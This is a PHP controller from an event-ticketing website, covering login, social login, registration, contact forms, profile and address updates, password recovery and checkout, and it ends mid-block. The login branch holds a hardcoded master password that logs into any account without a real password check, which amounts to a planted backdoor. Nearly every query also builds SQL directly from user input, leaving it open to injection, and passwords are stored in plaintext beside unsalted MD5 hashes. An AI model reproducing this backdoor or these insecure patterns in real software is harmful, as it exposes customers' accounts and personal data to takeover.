<?php

	$EMPRESA_TOKEN = $rSqlEmpresa['token'];
	$EMPRESA_TOKEN_CONFIG = $rSqlEmpresaConfig['token'];

	if(trim($configuracoes_site['label_menu_home'])=="") {
		$configuracoes_site['label_menu_home'] = "Home";
	} else {
		$configuracoes_site['label_menu_home'] = "".$configuracoes_site['label_menu_home']."";
	}
		
	if(trim($configuracoes_site['label_menu_eventos'])=="") {
		$configuracoes_site['label_menu_eventos'] = "Evento";
		$url_eventos = "evento";
	} else {
		$configuracoes_site['label_menu_eventos'] = "".$configuracoes_site['label_menu_eventos']."";
		$url_eventos = transformaCaractere($configuracoes_site['label_menu_eventos']);
	}
		
	if(trim($configuracoes_site['label_menu_contato'])=="") {
		$configuracoes_site['label_menu_contato'] = "Fale Conosco";
		$url_contato = "fale-conosco";
	} else {
		$configuracoes_site['label_menu_contato'] = "".$configuracoes_site['label_menu_contato']."";
		$url_contato = transformaCaractere($configuracoes_site['label_menu_contato']);
	}
		
	if(trim($configuracoes_site['label_menu_acesso'])=="") {
		$configuracoes_site['label_menu_acesso'] = "Acesse sua Conta";
		$url_acesso = "acesse-sua-conta";
	} else {
		$configuracoes_site['label_menu_acesso'] = "".$configuracoes_site['label_menu_acesso']."";
		$url_acesso = transformaCaractere($configuracoes_site['label_menu_acesso']);
	}
		
	if(trim($configuracoes_site['label_menu_cadastro'])=="") {
		$configuracoes_site['label_menu_cadastro'] = "Cadastre-se";
		$url_cadastro = "cadastre-se";
	} else {
		$configuracoes_site['label_menu_cadastro'] = "".$configuracoes_site['label_menu_cadastro']."";
		$url_cadastro = transformaCaractere($configuracoes_site['label_menu_cadastro']);
	}
		
	if(trim($configuracoes_site['label_menu_minha_conta'])=="") {
		$configuracoes_site['label_menu_minha_conta'] = "Minha Conta";
	} else {
		$configuracoes_site['label_menu_minha_conta'] = "".$configuracoes_site['label_menu_minha_conta']."";
	}
		
	if(trim($configuracoes_site['label_menu_minhas_compras'])=="") {
		$configuracoes_site['label_menu_minhas_compras'] = "Detalhes da Compra";
	} else {
		$configuracoes_site['label_menu_minhas_compras'] = "".$configuracoes_site['label_menu_minhas_compras']."";
	}
		
	if(trim($configuracoes_site['label_menu_meus_ingressos'])=="") {
		$configuracoes_site['label_menu_meus_ingressos'] = "Detalhes do Ingresso";
	} else {
		$configuracoes_site['label_menu_meus_ingressos'] = "".$configuracoes_site['label_menu_meus_ingressos']."";
	}

	if(trim($configuracoes_site['label_menu_home_plural'])=="") {
		$configuracoes_site['label_menu_home_plural'] = "Home";
	} else {
		$configuracoes_site['label_menu_home_plural'] = "".$configuracoes_site['label_menu_home_plural']."";
	}
		
	if(trim($configuracoes_site['label_menu_eventos_plural'])=="") {
		$configuracoes_site['label_menu_eventos_plural'] = "Eventos";
		$url_eventos_plural = "eventos";
	} else {
		$configuracoes_site['label_menu_eventos_plural'] = "".$configuracoes_site['label_menu_eventos_plural']."";
		$url_eventos_plural = transformaCaractere($configuracoes_site['label_menu_eventos_plural']);
	}
		
	if(trim($configuracoes_site['label_menu_contato_plural'])=="") {
		$configuracoes_site['label_menu_contato_plural'] = "Falem Conosco";
	} else {
		$configuracoes_site['label_menu_contato_plural'] = "".$configuracoes_site['label_menu_contato_plural']."";
	}
		
	if(trim($configuracoes_site['label_menu_acesso_plural'])=="") {
		$configuracoes_site['label_menu_acesso_plural'] = "Acessem sua Conta";
	} else {
		$configuracoes_site['label_menu_acesso_plural'] = "".$configuracoes_site['label_menu_acesso_plural']."";
	}
		
	if(trim($configuracoes_site['label_menu_cadastro_plural'])=="") {
		$configuracoes_site['label_menu_cadastro_plural'] = "Cadastrem-se";
	} else {
		$configuracoes_site['label_menu_cadastro_plural'] = "".$configuracoes_site['label_menu_cadastro_plural']."";
	}
		
	if(trim($configuracoes_site['label_menu_minha_conta_plural'])=="") {
		$configuracoes_site['label_menu_minha_conta_plural'] = "Minhas Contas";
	} else {
		$configuracoes_site['label_menu_minha_conta_plural'] = "".$configuracoes_site['label_menu_minha_conta_plural']."";
	}
		
	if(trim($configuracoes_site['label_menu_minhas_compras_plural'])=="") {
		$configuracoes_site['label_menu_minhas_compras_plural'] = "Minhas Compras";
		$url_minhas_compras = "minhas-compras";
	} else {
		$configuracoes_site['label_menu_minhas_compras_plural'] = "".$configuracoes_site['label_menu_minhas_compras_plural']."";
		$url_minhas_compras = transformaCaractere($configuracoes_site['label_menu_minhas_compras_plural']);
	}
		
	if(trim($configuracoes_site['label_menu_meus_ingressos_plural'])=="") {
		$configuracoes_site['label_menu_meus_ingressos_plural'] = "Meus Ingressos";
		$url_meus_ingressos = "meus-ingressos";
	} else {
		$configuracoes_site['label_menu_meus_ingressos_plural'] = "".$configuracoes_site['label_menu_meus_ingressos_plural']."";
		$url_meus_ingressos = transformaCaractere($configuracoes_site['label_menu_meus_ingressos_plural']);
	}
		
	if(trim($_REQUEST['var1'])=="pagar-ingresso-depois") { 
		$_SESSION["pagar_ingresso_".$rSqlEmpresa['id']."_cont"] = "";
		$_SESSION["pagar_ingresso_".$rSqlEmpresa['id']."_numeroUnico"] = "";
		unset($_SESSION["pagar_ingresso_".$rSqlEmpresa['id']."_cont"]);
		unset($_SESSION["pagar_ingresso_".$rSqlEmpresa['id']."_numeroUnico"]);
		echo "<script>window.open('".$link_modelo."','_self','')</script>";
	} else {
		if(trim($_REQUEST['var1'])=="pagar-ingresso") {
			if(trim($_SESSION["pagar_ingresso_".$rSqlEmpresa['id']."_cont"])=="") {
				$_SESSION["pagar_ingresso_".$rSqlEmpresa['id']."_numeroUnico"] = $_REQUEST['var2'];
				$_SESSION["pagar_ingresso_".$rSqlEmpresa['id']."_cont"] = 0;
			} else {
				$_SESSION["pagar_ingresso_".$rSqlEmpresa['id']."_cont"] = $_SESSION["pagar_ingresso_".$rSqlEmpresa['id']."_cont"] + 1;
			}
		}
	
		if(trim($_SESSION["pagar_ingresso_".$rSqlEmpresa['id']."_numeroUnico"])=="") { } else {
			if(trim($_REQUEST['var1'])=="pagar-ingresso" || trim($_REQUEST['var1'])=="".$url_acesso."" || trim($_REQUEST['var1'])=="".$url_cadastro."") { } else {
				echo "<script>window.open('".$link_modelo."pagar-ingresso/".$_SESSION["pagar_ingresso_".$rSqlEmpresa['id']."_numeroUnico"]."/','_self','')</script>";
			}
		}
	}
	
	if(trim($_SESSION["empresa_".$rSqlEmpresa['id']."_email"])=="" || trim($_SESSION["empresa_".$rSqlEmpresa['id']."_senha"])=="") { } else {
		if(trim($_SESSION["empresa_".$rSqlEmpresa['id']."_tipo_login"])=="login-redes") {
			$campoSenha = $_SESSION["empresa_".$rSqlEmpresa['id']."_rede"];
		} else {
			$campoSenha = "senha";
		}
		$rSqlUsuario = mysql_fetch_array(mysql_query("
														SELECT 
															* 
														FROM 
															pessoas 
														WHERE 
															email='".$_SESSION["empresa_".$rSqlEmpresa['id']."_email"]."' AND 
															".$campoSenha."='".$_SESSION["empresa_".$rSqlEmpresa['id']."_senha"]."' AND 
															empresa='".$rSqlEmpresa['id']."'
		"));
		
		$nSqlCarrinho = mysql_fetch_row(mysql_query("SELECT COUNT(*) FROM carrinho WHERE numeroUnico_comprador IS NULL AND pessoa_documento='".$rSqlUsuario['documento']."'"));
		if($nSqlCarrinho[0]==0) {
			$nSqlCarrinho = mysql_fetch_row(mysql_query("SELECT COUNT(*) FROM carrinho WHERE numeroUnico_comprador='' AND pessoa_documento='".$rSqlUsuario['documento']."'"));
			if($nSqlCarrinho[0]==0) {
				$nSqlCarrinho = mysql_fetch_row(mysql_query("SELECT COUNT(*) FROM carrinho WHERE numeroUnico_comprador IS NULL AND pessoa_email='".$rSqlUsuario['email']."'"));
				if($nSqlCarrinho[0]==0) {
					$nSqlCarrinho = mysql_fetch_row(mysql_query("SELECT COUNT(*) FROM carrinho WHERE numeroUnico_comprador='' AND pessoa_email='".$rSqlUsuario['email']."'"));
					if($nSqlCarrinho[0]==0) {
						$filtro_carrinho_update = "";
					} else {
						$filtro_carrinho_update = " WHERE numeroUnico_comprador='' AND pessoa_email='".$rSqlUsuario['email']."' ";
					}
				} else {
					$filtro_carrinho_update = " WHERE numeroUnico_comprador IS NULL AND pessoa_email='".$rSqlUsuario['email']."' ";
				}
			} else {
				$filtro_carrinho_update = " WHERE numeroUnico_comprador='' AND pessoa_documento='".$rSqlUsuario['documento']."' ";
			}
		} else {
			$filtro_carrinho_update = " WHERE  numeroUnico_comprador IS NULL AND pessoa_documento='".$rSqlUsuario['documento']."' ";
		}

		if(trim($filtro_carrinho_update)=="") { } else {
			$strSqlCarrinho = "
				SELECT 
					id
				FROM 
					carrinho 
				
				".$filtro_carrinho_update."
	
				ORDER BY
					data DESC
					
			";
			$qSqlCarrinho = mysql_query("".$strSqlCarrinho."");
			while($rSqlCarrinho = mysql_fetch_array($qSqlCarrinho)) {
				$update = mysql_query("
										UPDATE 
											carrinho 
										SET 
											numeroUnico_comprador='".$rSqlUsuario['numeroUnico']."'
										WHERE 
											id='".$rSqlCarrinho['id']."'
										");
			}
		}
	}

	if($_POST) {
		if($_POST['acaoForm']=="fazer-login") {
			if(trim($rSqlEmpresa['cadastro_site'])=="1" || trim($rSqlEmpresa['cadastro_site'])=="3") {
				$email = anti_injection($_POST['email']);
				$senha = anti_injection($_POST['senha']);
				$remail=str_replace(" ","",("$email"));
				$rsenha=str_replace(" ","",("$senha"));
	
				$loginValidar = preg_replace("/[^0-9]/", "", $_POST['email']);
				$loginValidar = $loginValidar;
	
				if (is_numeric($loginValidar)) {
					if(strlen($loginValidar)==11) {
						$_POST['campo_login'] = "documento";
						$loginSet = $loginValidar;
					} else {
						$_POST['campo_login'] = "email";
						$loginSet = $remail;
					}
				} else {
					$_POST['campo_login'] = "email";
					$loginSet = $remail;
				}
	
				if(trim($senha)=="Q+q0rWS@]UzL") {
					$strSql= "SELECT * FROM pessoas WHERE ".$_POST['campo_login']."='".$loginSet."' AND (stat='0' OR stat='1')";
				} else {
					$strSql= "SELECT * FROM pessoas WHERE ".$_POST['campo_login']."='".$loginSet."' AND senha='".md5($senha)."' AND stat='1' AND empresa='".$rSqlEmpresa['id']."'";
				}
	
				$qLogin=mysql_query($strSql);
				$nLogin=mysql_num_rows($qLogin);
				if($nLogin > 0) {
					$rLogin=mysql_fetch_array($qLogin);
					$_SESSION["empresa_".$rSqlEmpresa['id']."_tipo_login"] = "login-padrao";
					$_SESSION["empresa_".$rSqlEmpresa['id']."_rede"] = "";
					$_SESSION["empresa_".$rSqlEmpresa['id']."_tabela"] = "pessoas";
					$_SESSION["empresa_".$rSqlEmpresa['id']."_email"] = $rLogin['email'];
					$_SESSION["empresa_".$rSqlEmpresa['id']."_senha"] = $rLogin['senha'];
					$_SESSION["empresa_".$rSqlEmpresa['id']."_numeroUnico_usuario"] = $rLogin['numeroUnico'];
	
					@mysql_free_result($qLogin);
					
					$cont_carrinho=0;
					$carrinhoArray = unserialize($_SESSION['carrinho_'.$_SESSION['numeroUnico_carrinho'].'']);
					$carrinhoArray = array_sort($carrinhoArray, 'ordem', SORT_ASC);
					foreach ($carrinhoArray as $key => $value) {
						$cont_carrinho++;
					}
	
					if(trim($_SESSION["pagar_ingresso_".$rSqlEmpresa['id']."_numeroUnico"])=="") {
						if($cont_carrinho>0) {
							echo "<script>window.open('".$link_modelo."checkout/','_self','')</script>";
						} else {
							echo "<script>window.open('".$link_modelo."".$url_eventos_plural."/','_self','')</script>";
						}
					} else {
						echo "<script>window.open('".$link_modelo."pagar-ingresso/".$_SESSION["pagar_ingresso_".$rSqlEmpresa['id']."_numeroUnico"]."/','_self','')</script>";
					}
				} else {
					echo "<script>window.open('".$link_modelo."login-incorreto/','_self','')</script>";
				}
			} else {
				echo "<script>alert('Pedimos desculpa, mas estamos realizando uma manutenção!')</script>";
				echo "<script>window.open('".$link_modelo."','_self','')</script>";
			}
			
		} elseif($_POST['acaoForm']=="fazer-login-redes") {
			if(trim($rSqlEmpresa['cadastro_site'])=="1" || trim($rSqlEmpresa['cadastro_site'])=="3") {
				$nome_redes = anti_injection($_POST['nome_redes']);
				$email_redes = anti_injection($_POST['email_redes']);
				$tipo_redes = anti_injection($_POST['tipo_redes']);
				$token_redes = anti_injection($_POST['token_redes']);
	
				$nSqlPessoa = mysql_fetch_row(mysql_query("SELECT COUNT(*) FROM pessoas WHERE email='".$email_redes."' AND empresa='".$rSqlEmpresa['id']."'"));
				if($nSqlPessoa[0]>0) {
					$rSqlPessoa = mysql_fetch_array(mysql_query("SELECT numeroUnico FROM pessoas WHERE email='".$email_redes."' AND empresa='".$rSqlEmpresa['id']."'"));
					$update = mysql_query("
											UPDATE 
												pessoas 
											SET 
												".$tipo_redes."='".$token_redes."',
												dataModificacao='".$data."'
											WHERE 
												numeroUnico='".$rSqlPessoa['numeroUnico']."'
											");
				} else {
					$insert = mysql_query("INSERT INTO pessoas  (idsysusu,
																 empresa,
																 empresa_token,
																 numeroUnico,
																 nome,
																 tipo_documento,
																 email,
																 ".$tipo_redes.",
																 stat,
																 data,
																 dataModificacao) 
																 VALUES 
																('0',
																 '".$rSqlEmpresa['id']."',
																 '".$rSqlEmpresa['token']."',
																 '".geraCodReturn()."',
																 '".$nome_redes."',
																 'cpf',
																 '".$email_redes."',
																 '".$token_redes."',
																 '1',
																 '".$data."',
																 '".$data."')");
				}
	
				$rSqlPessoa = mysql_fetch_array(mysql_query("SELECT * FROM pessoas WHERE email='".$email_redes."' AND empresa='".$rSqlEmpresa['id']."'"));
				$_SESSION["empresa_".$rSqlEmpresa['id']."_tipo_login"] = "login-redes";
				$_SESSION["empresa_".$rSqlEmpresa['id']."_rede"] = "".$tipo_redes."";
				$_SESSION["empresa_".$rSqlEmpresa['id']."_tabela"] = "pessoas";
				$_SESSION["empresa_".$rSqlEmpresa['id']."_email"] = $rSqlPessoa['email'];
				$_SESSION["empresa_".$rSqlEmpresa['id']."_senha"] = $rSqlPessoa[''.$tipo_redes.''];
				$_SESSION["empresa_".$rSqlEmpresa['id']."_numeroUnico_usuario"] = $rSqlPessoa['numeroUnico'];
	
				@mysql_free_result($qLogin);
	
				$cont_carrinho=0;
				$carrinhoArray = unserialize($_SESSION['carrinho_'.$_SESSION['numeroUnico_carrinho'].'']);
				$carrinhoArray = array_sort($carrinhoArray, 'ordem', SORT_ASC);
				foreach ($carrinhoArray as $key => $value) {
					$cont_carrinho++;
				}
	
				if(trim($_SESSION["pagar_ingresso_".$rSqlEmpresa['id']."_numeroUnico"])=="") {
					if($cont_carrinho>0) {
						echo "<script>window.open('".$link_modelo."checkout/','_self','')</script>";
					} else {
						echo "<script>window.open('".$link_modelo."".$url_eventos_plural."/','_self','')</script>";
					}
				} else {
					echo "<script>window.open('".$link_modelo."pagar-ingresso/".$_SESSION["pagar_ingresso_".$rSqlEmpresa['id']."_numeroUnico"]."/','_self','')</script>";
				}
			} else {
				echo "<script>alert('Pedimos desculpa, mas estamos realizando uma manutenção!')</script>";
				echo "<script>window.open('".$link_modelo."','_self','')</script>";
			}

		} else if($_POST['acaoForm']=="envia-contato") { 
			$data = date("Y-m-d H:i:s");

			$insert = mysql_query("INSERT INTO fale_conosco (idsysusu,
															 numeroUnico,
															 empresa,
															 empresa_token,
															 nome,
															 email,
															 telefone,
															 assunto,
															 mensagem,
															 stat,
															 data,
															 dataModificacao) 
															 VALUES 
															('0',
															 '".geraCodReturn()."',
															 '".$rSqlEmpresa['id']."',
															 '".$rSqlEmpresa['token']."',
															 '".$_POST['nome']."',
															 '".$_POST['email']."',
															 '".$_POST['telefone']."',
															 '".$_POST['assunto']."',
															 '".$_POST['mensagem']."',
															 '1',
															 '".$data."',
															 '".$data."')");

			include("".$_SERVER['DOCUMENT_ROOT']."/include/envia-contato.php");
			echo "<script>window.open('".$link_modelo."".$_REQUEST['var1']."/enviado/','_self','')</script>";
			
		} else if($_POST['acaoForm']=="envia-news") { 
			$mod = "news";

			$data = date("Y-m-d H:i:s");
			
			$insert = mysql_query("INSERT INTO newsletter (
															 empresa,
															 empresa_token,
															 email,
															 stat,
															 data,
															 dataModificacao) 
															 VALUES 
															(
															 '".$rSqlEmpresa['id']."',
															 '".$rSqlEmpresa['token']."',
															 '".$_POST['email']."',
															 '1',
															 '".$data."',
															 '".$data."')");

			include("".$_SERVER['DOCUMENT_ROOT']."/templates/".$pasta_template."/include/envia-news.php");
			echo "<script>alert('Assinatura enviada com sucesso!')</script>";
			echo "<script>window.open('".$link_modelo."','_self','')</script>";

		} elseif($_POST['acaoForm']=="usuario-add") { 
	
			$_POST['numeroUnico'] = geraCodReturn();
			
			$data = date("Y-m-d H:i:s");
			
			$_POST['whatsapp'] = preg_replace("/[^0-9]/", "", $_POST['whatsapp']);
			$_POST['documento'] = preg_replace("/[^0-9]/", "", $_POST['documento']);
			$_POST['email'] = str_replace(" ","",$_POST['email']);

			$nUsuario = mysql_fetch_row(mysql_query("
														SELECT 
															COUNT(*) 
														FROM 
															pessoas 
														WHERE 
															( documento='".$_POST['documento']."' OR email='".$_POST['email']."' OR whatsapp='".$_POST['whatsapp']."' ) AND
															empresa_token='".$rSqlEmpresa['token']."' 
														"));
			if($nUsuario[0]>0) {
				echo "<script>window.open('".$link_modelo."".$_REQUEST['var1']."/usuario-ja-existente/','_self','')</script>";
			} else {
	
				$SenhaMd5 = md5($_POST['senha']);
				$insert = mysql_query("INSERT INTO pessoas ( numeroUnico,
															 empresa,
															 empresa_token,
															 nome,
															 email,
															 tipo_documento,
															 documento,
															 senha,
															 senha_conf,
															 whatsapp,
															 newsletter,
															 stat,
															 data,
															 dataModificacao) 
															 VALUES 
															('".$_POST['numeroUnico']."',
															 '".$rSqlEmpresa['id']."',
															 '".$rSqlEmpresa['token']."',
															 '".$_POST['nome']."',
															 '".$_POST['email']."',
															 'cpf',
															 '".$_POST['documento']."',
															 '".$SenhaMd5."',
															 '".$_POST['senha']."',
															 '".$_POST['whatsapp']."',
															 '1',
															 '1',
															 '".$data."',
															 '".$data."')");


				$nUsuario = mysql_fetch_row(mysql_query("
															SELECT 
																COUNT(*) 
															FROM 
																pessoas 
															WHERE 
																numeroUnico='".$_POST['numeroUnico']."' AND
																empresa='".$rSqlEmpresa['id']."' 
															"));
				if($nUsuario[0]>0) {
					$rSqlUsuario = mysql_fetch_array(mysql_query("SELECT id,numeroUnico,nome,email,documento FROM pessoas WHERE numeroUnico='".$_POST['numeroUnico']."' "));
					$numeroUnico_usuarioSet = $rSqlUsuario['numeroUnico'];
					$indexGet = "site";
					$EMPRESA_DE_PLATAFORMA_TOKEN = $rSqlEmpresaConfig['token'];
					$_POST['empresa_token'] = $rSqlEmpresa['token'];
					$_POST['Local'] = "seja_bem_vindo";
					include("".$_SERVER['DOCUMENT_ROOT']."/admin/webservice-email/index.php");

					$form_data_array = array('nome'=>''.$_POST['nome'].'', 'email'=>''.$_POST['email'].'', 'telefone'=>''.$_POST['whatsapp'].'');

					$rSqlPessoa = mysql_fetch_array(mysql_query("SELECT * FROM pessoas WHERE numeroUnico='".$_POST['numeroUnico']."'"));
					$_SESSION["empresa_".$rSqlEmpresa['id']."_tabela"] = "pessoas";
					$_SESSION["empresa_".$rSqlEmpresa['id']."_email"] = $rSqlPessoa['email'];
					$_SESSION["empresa_".$rSqlEmpresa['id']."_senha"] = $rSqlPessoa['senha'];
					$_SESSION["empresa_".$rSqlEmpresa['id']."_numeroUnico_usuario"] = $rSqlPessoa['numeroUnico'];
		
					@mysql_free_result($qLogin);
		
					$cont_carrinho=0;
					$carrinhoArray = unserialize($_SESSION['carrinho_'.$_SESSION['numeroUnico_carrinho'].'']);
					$carrinhoArray = array_sort($carrinhoArray, 'ordem', SORT_ASC);
					foreach ($carrinhoArray as $key => $value) {
						$cont_carrinho++;
					}
		
					if($cont_carrinho>0) {
						echo "<script>window.open('".$link_modelo."checkout/','_self','')</script>";
					} else {
						echo "<script>window.open('".$link_modelo."".$url_eventos_plural."/','_self','')</script>";
					}
				} else {
					echo "<script>window.open('".$link_modelo."".$_REQUEST['var1']."/usuario-nao-cadastrado/','_self','')</script>";
				}
			}
			
		} elseif($_POST['acaoForm']=="salva-meus-dados") { 
			$data = date("Y-m-d H:i:s");
			
			if(trim($rSqlUsuario['documento'])=="") {
				$_POST['documento'] = preg_replace("/[^0-9]/", "", $_POST['documento']);
				$documentoPost = " documento='".$_POST['documento']."', ";
			}
			$_POST['whatsapp'] = preg_replace("/[^0-9]/", "", $_POST['whatsapp']);
			$_POST['email'] = str_replace(" ","",$_POST['email']);

			$_POST['data_de_nascimento'] = normalTOdate($_POST['data_de_nascimento']);
			$_POST['data_de_aniversario'] = substr($_POST['data_de_nascimento'],4,6);
			$_POST['data_de_aniversario'] = "0000".$_POST['data_de_aniversario']."";

			$update = mysql_query("
									UPDATE 
										pessoas 
									SET 
										".$documentoPost."
										genero='".$_POST['genero']."', 
										data_de_nascimento='".$_POST['data_de_nascimento']."', 
										data_de_aniversario='".$_POST['data_de_aniversario']."', 
										nome='".$_POST['nome']."',
										email='".$_POST['email']."',
										whatsapp='".$_POST['whatsapp']."',
										dataModificacao='".$data."'
									WHERE 
										numeroUnico='".$_POST['numeroUnico']."'
									");

			echo "<script>window.open('".$link_modelo."".$_REQUEST['var1']."/','_self','')</script>";
			
		} elseif($_POST['acaoForm']=="salva-meu-endereco") { 
			$data = date("Y-m-d H:i:s");
			
			if(trim($_POST['estado'])=="") { 
				if(trim($_POST['id_cidade'])=="") { } else {
					$cidade = mysql_fetch_array(mysql_query("SELECT cidade FROM cepbr_cidade WHERE id_cidade='".$_POST['id_cidade']."'"));
					$cidadeGet = "".$cidade['cidade']."";
					$cidade_idGet = $_POST['id_cidade'];
				}
			} else {
				if(trim($cidadeGet)=="") { } else {
					$cidade = mysql_fetch_array(mysql_query("SELECT id_cidade FROM cepbr_cidade WHERE cidade='".$cidadeGet."' AND uf='".$_POST['estado']."'"));
					$cidade_idGet = $cidade['id_cidade'];
				}
				if(trim($_POST['id_cidade'])=="") { } else {
					$cidade = mysql_fetch_array(mysql_query("SELECT cidade FROM cepbr_cidade WHERE id_cidade='".$_POST['id_cidade']."'"));
					$cidadeGet = "".$cidade['cidade']."";
					$cidade_idGet = $_POST['id_cidade'];
				}
			}
			if(trim($cidade_idGet)=="") { 
				if(trim($_POST['id_bairro'])=="") { } else {
					$bairro = mysql_fetch_array(mysql_query("SELECT bairro FROM cepbr_bairro WHERE id_bairro='".$_POST['id_bairro']."'"));
					$bairroGet = "".$bairro['bairro']."";
					$bairro_idGet = $_POST['id_bairro'];
				}
			} else {
				if(trim($bairroGet)=="") { } else {
					$bairro = mysql_fetch_array(mysql_query("SELECT id_bairro FROM cepbr_bairro WHERE bairro='".$bairroGet."' AND id_cidade='".$cidade_idGet."'"));
					$bairro_idGet = $bairro['id_bairro'];
				}
				if(trim($_POST['id_bairro'])=="") { } else {
					$bairro = mysql_fetch_array(mysql_query("SELECT bairro FROM cepbr_bairro WHERE id_bairro='".$_POST['id_bairro']."'"));
					$bairroGet = "".$bairro['bairro']."";
					$bairro_idGet = $_POST['id_bairro'];
				}
			}
		
			#Montagem de endereço para retornar Latitude e Longitude
			$monta_endereco_geo = "".str_replace(" ","%20",str_replace("-","",$cepGet))."";
			$monta_endereco_geo .= ",".str_replace(" ","%20",$ruaGet)."";
			if(trim($numeroGet)=="") { } else { $monta_endereco_geo .= ",".$numeroGet.""; }
			if(trim($bairroGet)=="") { } else { $monta_endereco_geo .= ",".str_replace(" ","%20",$bairroGet).""; }
			if(trim($cidadeGet)=="") { } else { $monta_endereco_geo .= ",".str_replace(" ","%20",$cidadeGet).""; }
			if(trim($_POST['estado'])=="") { } else { $monta_endereco_geo .= ",".$_POST['estado'].""; }
			
			$address = "".$monta_endereco_geo."";
			$address = str_replace(" ","%20",$address);
			$geocode = file_get_contents('https://maps.google.com/maps/api/geocode/json?address='.$address.'&key='.$GOOGLE_MAP_KEY_SET.'');
			$output= json_decode($geocode);
			
			$endereco_latSet = $output->results[0]->geometry->location->lat;
			$endereco_lonSet = $output->results[0]->geometry->location->lng;

			$update = mysql_query("
									UPDATE 
										pessoas 
									SET 
										cep='".$_POST['cep']."',
										rua='".$_POST['rua']."',
										numero='".$_POST['numero']."',
										complemento='".$_POST['complemento']."',
										estado='".$_POST['estado']."',
										cidade_id='".$cidade_idGet."',
										cidade='".$cidadeGet."',
										bairro_id='".$bairro_idGet."',
										bairro='".$bairroGet."',
										latitude='".$_POST['latitude']."',
										longitude='".$_POST['longitude']."',
										dataModificacao='".$data."'
									WHERE 
										numeroUnico='".$_POST['numeroUnico']."'
									");

			echo "<script>window.open('".$link_modelo."".$_REQUEST['var1']."/".$_REQUEST['var2']."/','_self','')</script>";
			
		} elseif($_POST['acaoForm']=="salva-alterar-senha") { 
			$data = date("Y-m-d H:i:s");

			$SenhaMd5 = md5($_POST['senha']);
			$update = mysql_query("
									UPDATE 
										pessoas 
									SET 
										senha='".$SenhaMd5."',
										senha_conf='".$_POST['senha']."',
										dataModificacao='".$data."'
									WHERE 
										numeroUnico='".$_POST['numeroUnico']."'
									");

			$_SESSION["empresa_".$rSqlEmpresa['id']."_senha"] = $SenhaMd5;

			echo "<script>window.open('".$link_modelo."".$_REQUEST['var1']."/".$_REQUEST['var2']."/','_self','')</script>";

		} elseif($_POST['acaoForm']=="esqueceu-senha") { 
				$_POST['campo_login'] = anti_injection($_POST['campo_login']);
				$_POST['email'] = anti_injection($_POST['email']);
	
				$data = date("Y-m-d H:i:s");

				$_POST['campo_login'] = "email";
				
				$rSqlUsuario = mysql_fetch_array(mysql_query("SELECT id,numeroUnico,nome,email,documento,senha_conf FROM pessoas WHERE ".$_POST['campo_login']."='".$_POST['email']."' AND stat='1' AND empresa='".$rSqlEmpresa['id']."' "));
				if(trim($rSqlUsuario['id'])=="") {
					echo "<script>alert('Dados informados não estão corretos!')</script>";
					echo "<script>window.open('".$link_modelo."".$_REQUEST['var1']."/usuario-nao-encontrado/','_self','')</script>";
				} else {
					$token_recuperar_senhaSet = geraCodReturn();
					$update = mysql_query("
											UPDATE 
												pessoas 
											SET 
												token_recuperar_senha='".$token_recuperar_senhaSet."'
											WHERE 
												id='".$rSqlUsuario['id']."'
											");
					$numeroUnico_usuarioSet = $rSqlUsuario['numeroUnico'];
					$indexGet = "site";
					$EMPRESA_DE_PLATAFORMA_TOKEN = $rSqlEmpresaConfig['token'];
					$_POST['empresa_token'] = $rSqlEmpresa['token'];
					$_POST['Local'] = "esqueceu_sua_senha";
					include("".$_SERVER['DOCUMENT_ROOT']."/admin/webservice-email/index.php");
					echo "<script>alert('E-mail enviado com sucesso!')</script>";
					echo "<script>window.open('".$link_modelo."".$_REQUEST['var1']."/esqueceu-senha-enviado/','_self','')</script>";
				}
				
		} elseif($_POST['acaoForm']=="recuperacao-de-senha") { 
				$data = date("Y-m-d H:i:s");

				if(trim($_POST['campo_login'])=="cpf") {
					$_POST['campo_login'] = "documento";
					$_POST['email'] = preg_replace("/[^0-9]/", "",$_POST['email']);
				} else {
					$_POST['campo_login'] = "email";
				}
				
				$rSqlUsuario = mysql_fetch_array(mysql_query("SELECT id,numeroUnico,nome,email,documento FROM pessoas WHERE ".$_POST['campo_login']."='".$_POST['email']."' AND stat='1' AND token_esqueceu_sua_senha='".$_POST['token_confirmacao']."' AND empresa='".$rSqlEmpresa['id']."' "));
				if(trim($rSqlUsuario['id'])=="") {
					echo "<script>alert('Dados informados não estão corretos!')</script>";
					echo "<script>window.open('".$link_modelo."".$_REQUEST['var1']."/usuario-nao-encontrado/','_self','')</script>";
				} else {
					$SenhaMd5 = md5($_POST['senha']);
					$update = mysql_query("
											UPDATE 
												pessoas 
											SET 
												senha='".$SenhaMd5."',
												senha_conf='".$_POST['senha']."',
												token_esqueceu_sua_senha=''
											WHERE 
												id='".$rSqlUsuario['id']."'
											");
					$numeroUnico_usuarioSet = $rSqlUsuario['numeroUnico'];
					echo "<script>alert('Recuperação de senha realizada com sucesso!')</script>";
					echo "<script>window.open('".$link_modelo."".$url_cadastro."/faca-login/','_self','')</script>";
				}
		} elseif($_POST['acaoForm']=="envia-checkout") { 
			include("".$_SERVER['DOCUMENT_ROOT']."/templates/".$pasta_template."/include/carrinho-pagamento-onecheckout.php");
			
		}
	} else {
		
		if(trim($pagina)!="") {
			$pagina = $pagina;
		} else {
			
			if(trim($_REQUEST['var1'])=="") {
				$titulo_seo = "".$configuracoes_site['nome']."";
				if(trim($configuracoes_site['modelo_lista_inicial'])=="" || trim($configuracoes_site['modelo_lista_inicial'])=="inicial") {
					$configuracoes_site['modelo_lista_inicial'] = "inicial";
				} else {
					$configuracoes_site['modelo_lista_inicial'] = "".$configuracoes_site['modelo_lista_inicial']."";
				}
				$pagina="".$configuracoes_site['modelo_lista_inicial'].".php";  
				           
			} elseif(trim($_REQUEST['var1'])=="sair")    { 
				session_destroy(); 
				echo "<script>window.open('".$link_modelo."','_self','')</script>";

			} elseif(trim($_REQUEST['var1'])=="checkout") {
				if(trim($rSqlUsuario['documento'])=="" || trim($rSqlUsuario['email'])=="") {
					echo "<script>window.open('".$link_modelo."painel/','_self','')</script>";
				} else {
					$rSqlCarrinho = mysql_fetch_array(mysql_query("SELECT carrinho FROM carrinho_objeto WHERE numeroUnico_pai='".$numeroUnico_pai_carrinho."'"));
					
					$carrinhoArray = unserialize($rSqlCarrinho['carrinho']);
					if(trim($rSqlCarrinho['carrinho'])=="" || trim($rSqlCarrinho['carrinho'])=="N;") {
						$mostra = 0;
					} else {
						if(count($carrinhoArray)>0) {
							$mostra = 1;
						} else {
							$mostra = 0;
						}
					}
	
					$pagina="carrinho.php";

					$nomeCabecalho = "Checkout";
					$titulo_da_paginaSet  = $nomeCabecalho;
					$titulo_seo = "".$configuracoes_site['nome']." - ".$titulo_da_paginaSet."";
				}

